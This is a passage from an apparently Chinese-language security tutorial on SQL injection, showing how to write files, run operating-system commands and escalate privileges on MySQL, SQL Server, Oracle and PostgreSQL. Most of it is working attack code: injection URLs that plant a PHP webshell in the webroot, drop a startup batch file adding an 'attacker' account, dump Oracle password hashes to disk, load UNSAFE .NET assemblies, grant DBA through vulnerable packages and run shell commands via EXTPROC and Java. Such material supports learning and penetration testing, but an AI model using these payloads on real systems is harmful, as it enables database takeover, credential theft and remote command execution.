class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">04</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> FF FF <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token operator\">-</span>e <span class=\"token number\">0010</span> B8 <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">40</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> o0 o0 <span class=\"token number\">00</span>\n<span class=\"token operator\">-</span>е <span class=\"token number\">0040</span> <span class=\"token number\">0</span>E <span class=\"token number\">1</span>F BA OE <span class=\"token number\">00</span> B4 <span class=\"token number\">09</span> CD <span class=\"token number\">21</span> B8 <span class=\"token number\">01</span> <span class=\"token number\">4</span>C CD <span class=\"token number\">21</span> <span class=\"token number\">54</span> <span class=\"token number\">68</span>\n<span class=\"token operator\">-</span>е <span class=\"token number\">0050</span> <span class=\"token number\">69</span> <span class=\"token number\">73</span> <span class=\"token number\">20</span> <span class=\"token number\">70</span> <span class=\"token number\">72</span> <span class=\"token number\">6</span>F <span class=\"token number\">67</span> <span class=\"token number\">72</span> <span class=\"token number\">61</span> <span class=\"token number\">6</span>D <span class=\"token number\">20</span> <span class=\"token number\">63</span> <span class=\"token number\">61</span> <span class=\"token number\">6</span>E <span class=\"token number\">6</span>E <span class=\"token number\">6</span>F\n<span class=\"token operator\">-</span>е <span class=\"token number\">0060</span> <span class=\"token number\">74</span> <span class=\"token number\">20</span> <span class=\"token number\">62</span> <span class=\"token number\">65</span> <span class=\"token number\">20</span> <span class=\"token number\">72</span> <span class=\"token number\">75</span> <span class=\"token number\">6</span>E <span class=\"token number\">20</span> <span class=\"token number\">69</span> <span class=\"token number\">6</span>E <span class=\"token number\">20</span> <span class=\"token number\">44</span> <span class=\"token number\">4</span>F <span class=\"token number\">53</span> <span class=\"token number\">20</span>\n<span class=\"token operator\">-</span>e <span class=\"token number\">0070</span> <span class=\"token number\">6</span>D <span class=\"token number\">6</span>F <span class=\"token number\">64</span> <span class=\"token number\">65</span> <span class=\"token number\">2</span>E OD OD <span class=\"token number\">0</span>A <span class=\"token number\">24</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-</span>rex\nCX <span class=\"token number\">0000</span>\n:<span class=\"token number\">4200</span>\n<span class=\"token operator\">-</span>w <span class=\"token number\">0</span>\nWriting <span class=\"token number\">04200</span> bytes\n<span class=\"token operator\">-</span>q\nC:\\<span class=\"token keyword\">temp</span><span class=\"token operator\">&gt;</span>dir demo<span class=\"token operator\">*</span>\n<span class=\"token number\">2008</span><span class=\"token operator\">/</span><span class=\"token number\">12</span><span class=\"token operator\">/</span><span class=\"token number\">27</span> <span class=\"token number\">03</span>:<span class=\"token number\">18</span>p\t<span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">896</span> demo<span class=\"token punctuation\">.</span>com\n<span class=\"token number\">2005</span><span class=\"token operator\">/</span><span class=\"token number\">11</span><span class=\"token operator\">/</span><span class=\"token number\">21</span> <span class=\"token number\">11</span>:<span class=\"token number\">08</span>a\t<span class=\"token number\">61</span>r280 demo<span class=\"token punctuation\">.</span>scr\n\n\ncopy <span class=\"token operator\">/</span>b chunk<span class=\"token operator\">-</span><span class=\"token number\">1.</span>exe_ <span class=\"token operator\">+</span> chunk<span class=\"token operator\">-</span><span class=\"token number\">2.</span>exe_ <span class=\"token operator\">+</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">+</span> chunk<span class=\"token operator\">-</span>n<span class=\"token punctuation\">.</span>exe original<span class=\"token operator\">-</span><span class=\"token keyword\">file</span><span class=\"token punctuation\">.</span>exe <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"Oracle-6\"><a href=\"#Oracle-6\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h5><p>Oracle中多种创建文件的方法</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">UTL_FILE\nDBMS_ADVISOR\nDBMS_XSLPROCESSOR\nDBMS_XMLDOM\n外部表\nJava\n操作系统命令和重定向<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>自Oracle 9i以来，utl_file可以在文件系统上写二进制代码。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#在数据库服务器的C:驱动器或恰当的UNIX路径中创建了一个二进制文件hello.com：</span>\n<span class=\"token keyword\">Create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> directory EXT <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\';\nDECLARE fi UTL_FILE.FILE_TYPE;\nbu RAW(32767);\nBEGIN\nbu:=hextoraw(1BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfi:<span class=\"token operator\">=</span>UTL_FILE<span class=\"token punctuation\">.</span>fopen<span class=\"token punctuation\">(</span><span class=\"token string\">'EXT'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'hello.com'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">,</span><span class=\"token number\">32767</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_FILE<span class=\"token punctuation\">.</span>put_raw<span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">,</span>bu<span class=\"token punctuation\">,</span><span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_FILE<span class=\"token punctuation\">.</span>fclose<span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>DBMS_ADVISOR可能是创建文件的最快捷方法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> directory EXT <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\';\nexec SYS.DBMS_ADVISOR.CREATE_FILE('</span><span class=\"token keyword\">first</span> <span class=\"token keyword\">row</span><span class=\"token string\">', '</span>EXT<span class=\"token string\">','</span>victim<span class=\"token punctuation\">.</span>txt'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>自Oracle 10g以来，可以使用外部表创建一个包含用户名和口令的文件</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> directory EXT <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\';\nCREATE TABLE ext_write (\nmyline)\nORGANIZATION EXTERNAL\n(TYPE oracle_datapump\nDEFAULT DIRECTORY EXT\nLOCATION ('</span>victim3<span class=\"token punctuation\">.</span>txt<span class=\"token string\">'))\nPARALLEL\nAS\nSELECT '</span>I was here<span class=\"token string\">' from dual UNION SELECT name ||'</span><span class=\"token operator\">=</span>'<span class=\"token operator\">||</span>password <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>DBMS_XSLPROCESSOR可以将XML文件写入文件系统</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">exec</span> dbms_xslprocessor<span class=\"token punctuation\">.</span>clob2file<span class=\"token punctuation\">(</span>your_xml<span class=\"token punctuation\">,</span><span class=\"token string\">'MYDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'outfile.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>另外还可以通过DBMS_XMLDOM访问文统：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> DIRECTORY XML_DIR <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\xmlfiles'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exec</span> DBMS_XMLDOM<span class=\"token punctuation\">.</span>writeToFile<span class=\"token punctuation\">(</span>doc<span class=\"token punctuation\">,</span><span class=\"token string\">'XML_DIR/outfile.xml'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"PostgreSQL-4\"><a href=\"#PostgreSQL-4\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h5><p>PostgreSQL不但支持使用COPY功能读取文件，还支持使用COPY功能写入文件，它可以将表中的内容以文本格式写入一个文件中(每一行文本表示表中的一行数据)。文件将按照运行PostgreSQL进程(通常是postgres用户)的用户来创建，因此该用户需要对文件所在的路径具有写入权限。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#假定底层数据库用户具有所要求的“超级用户”权限,创建一个临时表</span>\nhttp:<span class=\"token comment\">//10.10.10.128/test.php?id=1; create table hack(data text);-- </span>\n<span class=\"token comment\">#在表中插入PHP Webshell代码</span>\nhttp:<span class=\"token comment\">//10.10.10.128/test.php?id=1; insert into hack(data) values (\"&lt;?php passthru($_GET['cmd']);&gt;\");-- </span>\n<span class=\"token comment\">#将表中的数据复制到一个文件中，将该文件放在Web根目录(Webroot)下</span>\nhttp:<span class=\"token comment\">//10.10.10.128/test.php?id=1; copy(select data from hack) to '/var/www/shell.php';-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>一些能够利用的函数</p>\n<p>lo_create()、lo_export()和lo_unlink()</p>\n<h3 id=\"执行操作系统命令\"><a href=\"#执行操作系统命令\" class=\"headerlink\" title=\"执行操作系统命令\"></a>执行操作系统命令</h3><h4 id=\"MySQL-2\"><a href=\"#MySQL-2\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h4><p>MySQL服务器和Web服务器位于同一机器上，这样就能使用”select into DUMPFILE”技术在目标机器上构造一个欺骗性的公共网关接口(CGI)</p>\n<p>在WAMP(Windows、Apache、MySQL和PHP)环境中，MySQL常常运行在特权用户权限下，因此攻击者可以在系统的任何位置写入文件。可以根据这一特点采用被动代码执行技术(passive code execution),比如在Administrator的启动文件夹中创建一个批处理文 件。当管理员登录到系统后，攻击者的批处理文件将被执行，并且攻击者的代码将在管理员权 限下执行。</p>\n<p>下面的例子演示了这种攻击：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//vulnsite/vuln.php?name=test' union select 'net user attacker pwd /add' into outfile 'c:\\documents and settings\\all users\\start menu\\programs\\startup\\owned.bat'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Mssql-2\"><a href=\"#Mssql-2\" class=\"headerlink\" title=\"Mssql\"></a>Mssql</h4><p>xp_cmdshell的妙用</p>\n<p>现代版本的SQL Server默认禁用了 xp_cmdshell，可以使用sp_configure语句并通过带内信令(signaling)再次打开它。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#通过T-SQL初始化Wscript.Shell实例的方法</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">PROCEDURE</span> xp_cmdshell3<span class=\"token punctuation\">(</span><span class=\"token variable\">@cmd</span> <span class=\"token keyword\">varchar</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> @ wait <span class=\"token keyword\">int</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span><span class=\"token comment\">-- </span>\n<span class=\"token keyword\">Create</span> wscript<span class=\"token punctuation\">.</span>Shell object \n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@result</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@RunResult</span> <span class=\"token keyword\">int</span> <span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@ShellID</span> <span class=\"token keyword\">int</span> \n<span class=\"token keyword\">EXECUTE</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">=</span> sp_OACreate <span class=\"token string\">'WScript.Shell'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@shellID</span> <span class=\"token keyword\">OUT</span> \n<span class=\"token keyword\">IF</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">&lt;&gt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">@OLEResult</span> \n<span class=\"token keyword\">IF</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">&lt;&gt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">RAISERROR</span><span class=\"token punctuation\">(</span><span class=\"token string\">'CreateObject0X'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@OLEResult</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">EXECUTE</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">=</span> sp_OAMethod <span class=\"token variable\">@ShellID</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Run'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">Null</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@cmd</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@wait</span> \n<span class=\"token keyword\">IF</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">&lt;&gt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">@OLEResult</span> \n<span class=\"token keyword\">IF</span> <span class=\"token variable\">@OLEResult</span> <span class=\"token operator\">&lt;&gt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">RAISERROR</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Run8OX'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@OLEResult</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">--If @OLEResult &lt;&gt; 0 EXEC sp_displayoaerrorinfo @shellID, @OLEResult </span>\n<span class=\"token keyword\">EXECUTE</span> QOLEResult <span class=\"token operator\">=</span> sp_OADestroy <span class=\"token variable\">@ShellID</span> \n<span class=\"token keyword\">return</span> <span class=\"token variable\">@result</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用CREATE ASSEMBLY指令促使SQL Server从系统中加载文件。如果想使用该功能加载一个有效的.NET二进制文件，有三种选择：</p>\n<ul>\n<li><p>创建并加载本地可执行文件：</p>\n<p>在系统中创建源文件； 将源文件编译为可执行文件； 从 C:\\temp\\foo.dll 调用 CREATE ASSEMBLY FOO。</p>\n</li>\n<li><p>从UNC共享加载可执行文件：</p>\n<p>在公共访问的Windows共享中创建DLL(或EXE)； 从\\public_server\\temp\\fbo.dll 调用 CREATE ASSEMBLYFOO。</p>\n</li>\n<li><p>从传递的字符串创建可执行文件：</p>\n<ol>\n<li><p>创建可执行文件。</p>\n</li>\n<li><p>将可执行文件分解成HEX：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">File</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"moo.dll\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">\"H*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>\"<span class=\"token number\">4</span>d5a90000300000004000000ffff0<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>从 4d5a90000300000004000000ffff0 调用CREATE ASSEMBLY MOO</p>\n</li>\n</ol>\n</li>\n</ul>\n<p>NET提供的信任级别</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">SAFE：\n＞执行计算\n＞禁止访问外部资源\nEXTERNAL_ACCESS:\n＞访问硬盘\n＞访问环境\n＞带某些限制的几乎完全的访问\nUNSAFE：\n＞等价于完全信任\n＞调用非托管代码\n＞以SYSTEM身份做任何事情<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们的目标是以UNSAFE级别加载二进制文件。将数据库设置为“Trustworthy”可以绕开这种限制。</p>\n<p>不受限制地创建一个.NET二进制文件，然后使用设置为UNSAFE的许可将其导入到系统中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> <span class=\"token keyword\">database</span> master <span class=\"token keyword\">set</span> Trustworthy <span class=\"token keyword\">on</span> <span class=\"token keyword\">CREATE</span> ASSEMELY shoe <span class=\"token keyword\">FROM</span> Ox4d5a90<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">WITH</span> PERMISSION_SET<span class=\"token operator\">=</span>unsafe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Oracle-7\"><a href=\"#Oracle-7\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h4><p>代码的执行通常要求数据库用户具有DBA权限</p>\n<h5 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h5><p>特定的PL/SQL块(比如函数、存储过程、触发器、 视图等)都是在特定的权限之下才能执行</p>\n<p>Oracle带有许多默认的安装包，这些包中包含了大量的对象(表、视 图、函数、过程等等)，SYS具有最高级别的访问权限，在SYS权限下执行SQL语句就能赋予自己DAB角色。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#以一个非特权用户test连接到数据库</span>\n\n<span class=\"token comment\">#创建一个函数并注入易受攻击的过程</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> X <span class=\"token keyword\">return</span> varchar2\nauthid <span class=\"token keyword\">current_user</span> <span class=\"token keyword\">as</span> \npragna autononous_transaction<span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">BEGIN</span> \n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE <span class=\"token string\">'GRANT DBA TO SCOTT'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">COMMIT</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">RETURN</span> \n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exec</span> SYS<span class=\"token punctuation\">.</span>LT<span class=\"token punctuation\">.</span>CREATEVORKSPACE<span class=\"token punctuation\">(</span><span class=\"token string\">'zz'' and scott.x&lt;&gt;=''x'</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exec</span> SYS<span class=\"token punctuation\">.</span>LT<span class=\"token punctuation\">.</span>RENOUEWORKSPACE<span class=\"token punctuation\">(</span><span class=\"token string\">'zz'' and scott.x&lt;&gt;=''x'</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_role_privs<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#可以看到SCOTT具有DBA角色</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#具有 CREATE ANY PROCEDURE 和 EXECUTE ANY PROCEDURE 权限的用户可以在SYSTEM模式下创建一个存储过程：</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">procedure</span> SYSTEM<span class=\"token punctuation\">.</span>DBATEST\n<span class=\"token operator\">IS</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE <span class=\"token string\">'GRANT DBA TO SCOTT'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span>\n\n<span class=\"token keyword\">EXEC</span> SYSTEM<span class=\"token punctuation\">.</span>DBATEST<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"通过直接访问执行代码\"><a href=\"#通过直接访问执行代码\" class=\"headerlink\" title=\"通过直接访问执行代码\"></a>通过直接访问执行代码</h5><p>如果可以直接访问Oracle实例，那么根据Oracle版本的不同，可以使用下列多种不同的方法。</p>\n<p><code>Oracle EXTPROC</code>、<code>Java</code>、<code>DBMS_SCHEDULER</code>是Oracle运行操作系统命令的正式方法。</p>\n<p>使用Oracle数据库中的其他功能来执行操作系统代码，包括<code>PL/SQL native</code>、<code>Oracle Text</code> 、<code>Alter System set 事件</code>、<code>PL/SQL native 9i</code>、<code>Buffer overflow（缓冲区溢出）+ shell代码</code>、<code>Custom code（自定义代码）</code></p>\n<ul>\n<li><p><code>Oracle EXTPROC</code>和<code>Java</code></p>\n<p><a href=\"http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql\">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p>\n</li>\n<li><p><code>Oracle EXTPROC</code></p>\n<p>Oracle数据库的PL/SQL程序设计语言可以通过EXTPROC执行外部过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#恶意用户首先创建一个共享对象(shared object)—通常是DLL文件或系统库，其中包含了允许执行OS代码的功能：</span>\n<span class=\"token comment\">-- 对于Windows系统</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> LIBRARY exec_shell <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\windows\\system32\\msvcrt.dll'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 对于UNIX系统</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> LIBRARY exec_shell <span class=\"token keyword\">AS</span> <span class=\"token string\">'/lib/libc-2.2.5.so'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">#创建一个过程，调用该库的系统函数：</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">procedure</span> oraexec<span class=\"token punctuation\">(</span>cmdstring <span class=\"token operator\">IN</span> <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">is</span> external NAME <span class=\"token string\">\"system\"</span>\nlibrary exec_shell\n<span class=\"token keyword\">LANGUAGE</span> C<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">#执行该过程：</span>\n<span class=\"token keyword\">exec</span> oraexec<span class=\"token punctuation\">(</span><span class=\"token string\">'net user hacker hack3r /ADD'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#当执行oraexec过程时，数据库指示EXTPROC加载msvcrt.dll或libc库，并执行system()函数。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>通过Java库执行操作系统命令</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#查看用户Java(文件和执行)的许可权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_java_policy <span class=\"token keyword\">where</span> grantee_name <span class=\"token operator\">=</span> <span class=\"token string\">'SCOTT'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>数据库用户具有正确的Java IO许可权限，执行OS代码的方法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#DBMS_JAVA.RUNJAVA(受影响的系统：11g R1、11g R2)：</span>\nhttp:<span class=\"token comment\">//192.168.2.10/ora8.php?name=SCOTT' and (SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c dir&gt;C:\\\\OUT.LST') FROM DUAL) is not null -- </span>\n\n<span class=\"token string\">'\n#DBMS_JAVA_TEST.FUNCALL(受影响的系统：9iR2、10g R2、11g R1、11g R2)：\nhttp://192.168.2.10/ora8.php?name=SCOTT'</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">Select</span> DBMS_JAVA_TEST<span class=\"token punctuation\">.</span>FUNCALL<span class=\"token punctuation\">(</span><span class=\"token string\">'oracle/aurora/util/Wrapper '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c:\\\\windows\\\\system32\\\\cmd.exe'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/c'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'dir&gt;c:\\\\OUT2.LST'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> DUAL<span class=\"token punctuation\">)</span> <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span> <span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\"># DBMS_JVM_EXP_PERMS允许具有CREATE SESSION权限的用户授予自己Java IO许可权限：</span>\n<span class=\"token keyword\">DECLARE</span> POL DBMS_JVM_EXP_PERMS<span class=\"token punctuation\">.</span>TEMP_JAVA_POLICY<span class=\"token punctuation\">;</span> <span class=\"token keyword\">CURSOR</span> Cl <span class=\"token operator\">IS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token string\">''</span><span class=\"token keyword\">GRANT</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span>SYS<span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span>java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span>FilePermission<span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token 